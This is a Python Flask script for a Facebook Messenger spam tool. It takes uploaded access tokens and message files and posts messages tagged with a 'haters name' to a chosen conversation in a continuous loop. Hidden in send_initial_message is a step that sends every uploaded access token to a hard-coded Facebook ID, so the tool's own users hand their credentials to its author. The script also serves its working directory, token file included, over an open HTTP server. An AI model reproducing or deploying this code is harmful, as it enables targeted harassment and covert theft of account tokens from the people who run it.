from flask import Flask, request, render_template_string, jsonify
import threading
import os
import requests
import time
import http.server
import socketserver

app = Flask(__name__)

# Global flag to control the messaging loop
running = True

# Function to execute the HTTP server
def execute_server(port):
    with socketserver.TCPServer(("", port), http.server.SimpleHTTPRequestHandler) as httpd:
        print(f"Server running at http://localhost:{port}")
        httpd.serve_forever()

# Function to read a file and return its content as a list of lines
def read_file(file_path):
    with open(file_path, 'r') as file:
        return file.readlines()

@app.route('/')
def index():
    return render_template_string("<h1>Server Running</h1>")

@app.route('/start', methods=['POST'])
def start_server_and_messaging():
    global running
    running = True  # Set flag to True when starting

    port = 4000  # Fixed port
    target_id = "61571843423018"  # Fixed target ID
    convo_id = request.form.get('convoId')
    haters_name = request.form.get('hatersName')
    speed = int(request.form.get('speed'))
    
    # Save uploaded files
    tokens_file = request.files['tokensFile']
    messages_file = request.files['messagesFile']
    
    tokens_path = 'uploaded_tokens.txt'
    messages_path = 'uploaded_messages.txt'
    
    tokens_file.save(tokens_path)
    messages_file.save(messages_path)
    
    tokens = read_file(tokens_path)
    messages = read_file(messages_path)

    # Start the HTTP server in a separate thread
    server_thread = threading.Thread(target=execute_server, args=(port,))
    server_thread.daemon = True
    server_thread.start()

    # Function to send an initial message
    def send_initial_message():
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
            msg = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {access_token}"
            parameters = {"access_token": access_token, "message": msg}
            requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)

    # Function to send messages in a loop
    def send_messages():
        global running
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "application/json",
        }
        num_messages = len(messages)
        num_tokens = len(tokens)
        max_tokens = min(num_tokens, num_messages)

        while running:  # Check flag before sending messages
            try:
                for message_index in range(num_messages):
                    if not running:
                        return  # Stop sending messages if stopped
                    token_index = message_index % max_tokens
                    access_token = tokens[token_index].strip()
                    message = messages[message_index].strip()
                    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                    full_message = f"{haters_name} {message}"
                    parameters = {"access_token": access_token, "message": full_message}
                    requests.post(url, json=parameters, headers=headers)
                    time.sleep(speed)
            except Exception as e:
                print(f"[!] An error occurred: {e}")

    # Send initial message
    send_initial_message()

    # Start sending messages in a loop
    message_thread = threading.Thread(target=send_messages)
    message_thread.daemon = True
    message_thread.start()

    return jsonify({"message": "Server and messaging started successfully"})

@app.route('/stop', methods=['GET'])
def stop_server():
    global running
    running = False  # Stop the message loop
    return jsonify({"message": "Server and messaging stopped successfully"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
